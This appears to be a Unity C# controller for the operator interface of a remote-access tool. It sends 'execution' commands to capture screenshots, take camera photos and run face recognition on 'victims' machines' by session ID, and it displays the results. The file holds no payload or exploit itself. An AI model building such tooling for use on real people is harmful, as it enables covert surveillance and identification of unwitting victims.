using System.Collections;
using UnityEngine;
using Assets.Scripts.ConnManager;
using Newtonsoft.Json.Linq;
using UnityEngine.Networking;
using UnityEngine.UI;
using Assets.Scripts.Configs;
using Assets.Scripts.Parsers;
using Microsoft.MixedReality.Toolkit.UI;
using TMPro;
using System.Linq;
using UnityEditor;
using Assets.Scripts.Database;


//this script to manipulate the actions performed to victims' machine
public class ActionsPageController : MonoBehaviour
{
    [Header("Buttons")]
    public GameObject ScreenshotButton;
    public GameObject TakePhotoButton;
    public GameObject DetailsButton;

    [Header("Panels")]
    public GameObject ImagePanel;           // Does not need to set inactive for current version
    public GameObject RecogniztionPanel;
    public GameObject ActionsPanel;

    [Header("Lables")]
    public GameObject ProgressLabel;

    [Header("Configs")]
    public float delayAfterRecognized;

    public static ActionsPageController instance;

    private ConnectionManager connection;
    private static int sessionID;
    private static bool showDetailsButton;
    private static string recName;
    private static string firstName;
    private static string lastName;

    private enum actionTypes
    {
        takePhoro,
        takeScreenshot,
        identify
    }

    void Start()
    {
        Debug.Log("ActionsPage Started!");

        if (instance == null)
        {
            instance = this;
        }
        else if (instance != this)
        {
            Destroy(gameObject);
        }

        connection = new ConnectionManager();

        MainDataController.instance.DataCenterInstance.UpdatedNotification += new MainDataController.DataCenter.UpdatedEventHandler((updatedType) =>
        {
            // Handling the updated info
            if (updatedType == MainDataController.DataCenter.UpdatedType.ObtainedScreenshot)
            {
                StartCoroutine(connection.LoadRawImageTo(ImagePanel.GetComponentInChildren<RawImage>(), Global.SCREENSHOT_PATH_ON_SERVER + MainDataController.instance.DataCenterInstance.GetScreenshotFileName(), 800, 600));
            }
            if (updatedType == MainDataController.DataCenter.UpdatedType.ObtainedPhoto)
            {
                StartCoroutine(connection.LoadRawImageTo(ImagePanel.GetComponentInChildren<RawImage>(), Global.PHOTO_PATH_ON_SERVER + MainDataController.instance.DataCenterInstance.GetPhotoFileName(), 45, 30));
            }
            if (updatedType == MainDataController.DataCenter.UpdatedType.IdentifiedVictim)
            {
                this.finishRecognizing();
            }
        });

        // Init panels
        this.initPage();
    }

    private void initPage()
    {
        RecogniztionPanel.SetActive(false);
        ActionsPanel.SetActive(false);
        this.adjustProgress(0);
    }

    public static int GetSessionID() { return sessionID; }
    public static void SetSessionID(int sid) { sessionID = sid; }

    public void Begin()
    {
        this.initPage();

        if (showDetailsButton)
        {
            DetailsButton.SetActive(true);
        }
        else
        {
            DetailsButton.SetActive(false);
        }

        VictimsParser victims = MainDataController.instance.DataCenterInstance.GetVictimsParser();
        if (victims == null)
        {
            return;
        }
        if (victims.GetVictimBySessionID(GetSessionID()).IsIdentified)
        {
            this.showActionsPanel();
        }
        else
        {
            this.recognizing();
        }
    }

    /*
     * If the selected victim is not identified, this function will call the server to try to ifentify this victim.
     * While this function is execuated, we need to adjust the progress bar.
     */
    private void recognizing()
    {
        this.showRecogniztionPanel();
        // Requesting for recognizing
        this.adjustProgress(20);
        connection.SendData(this.getJSONsByAction(actionTypes.identify));
        new WaitForSeconds(2);
        this.adjustProgress(40);
        new WaitForSeconds(2);
        Invoke("finishRecognizing", (delayAfterRecognized != 0.0) ? delayAfterRecognized : 8);
    }

    private void finishRecognizing()
    {
        if (ActionsPanel.activeInHierarchy) { return; }
        this.adjustProgress(100);
        new WaitForSeconds(1);
        this.showActionsPanel();
    }

    private void showActionsPanel()
    {
        IdentifiedVictimsParser identifiedVictims = MainDataController.instance.DataCenterInstance.GetIdentifiedVictimsParser();
        string initImage = "/DB/Wenbin/wenbin_face.jpg";
        if (identifiedVictims != null)
        {
            IdentifiedVictimsParser.IdentifiedVictim victim = identifiedVictims.GetIdentifiedVictimBySessionID(GetSessionID());
            if (victim != null)
            {
                initImage = "/" + victim.ProfileInfo.Picture;
            }
        }
        // Load Image
        StartCoroutine(connection.LoadRawImageTo(ImagePanel.GetComponentInChildren<RawImage>(), initImage, 30, 45));

        RecogniztionPanel.SetActive(false);
        ActionsPanel.SetActive(true);
    }

    private void showRecogniztionPanel()
    {
        ActionsPanel.SetActive(false);
        RecogniztionPanel.SetActive(true);
        // Reset progress
        this.adjustProgress(0);
    }

    private void adjustProgress(int progress)
    {
        if (ProgressLabel == null)
        {
            return;
        }

        ProgressLabel.GetComponent<TMP_Text>().text = progress.ToString() + "%";
    }

    public void TakeScreenshot()
    {
        Debug.Log("Taking Screenshot!");
        connection.SendData(this.getJSONsByAction(actionTypes.takeScreenshot));
    }

    public void TakePhoto()
    {
        Debug.Log("Taking Photo!");
        connection.SendData(this.getJSONsByAction(actionTypes.takePhoro));
    }

    private string getJSONsByAction(actionTypes type)
    {
        if (sessionID == 0) { Debug.LogWarning("The Session ID probably is not valid, please check it."); }
        switch (type)
        {
            case actionTypes.takePhoro:
                return "{\"command\":\"execution\", \"content\": { \"session_id\":" + GetSessionID() + ", \"action\": \"picture\", \"para\":\"\" }}";
            case actionTypes.takeScreenshot:
                return "{\"command\":\"execution\", \"content\": { \"session_id\":" + GetSessionID() + ", \"action\": \"screenshot\", \"para\":\"\" }}";
            case actionTypes.identify:
                return "{\"command\":\"execution\", \"content\": { \"session_id\":" + GetSessionID() + ", \"action\": \"identify\", \"para\":\"\" }}";
            default:
                return "";
        }
    }

    public static void SetNames(string fname, string lname, string name)
    {
        recName = name;
        firstName = fname;
        lastName = lname;
    }

    public static void SetShowDetails(bool showDetails)
    {
        showDetailsButton = showDetails;
    }

    private void setSelectedVictimName()
    {
        MainDataController.DataCenter.PersonName name = MainDataController.instance.DataCenterInstance.GetNamesOfSelectedVictim();
        name.FirstName = firstName;
        name.LastName = lastName;
        MainDataController.instance.DataCenterInstance.SetNamesOfSelectedVictim(name);
    }

    public void showDetails()
    {
        FaceRecName.instance.recName = recName;
        NewMainUIController.instance.newmainUI.SetActive(false);
        this.setSelectedVictimName();
        MainDataController.instance.InsertData();
        SpeechManager.instance.ContinueToMain();
    }
}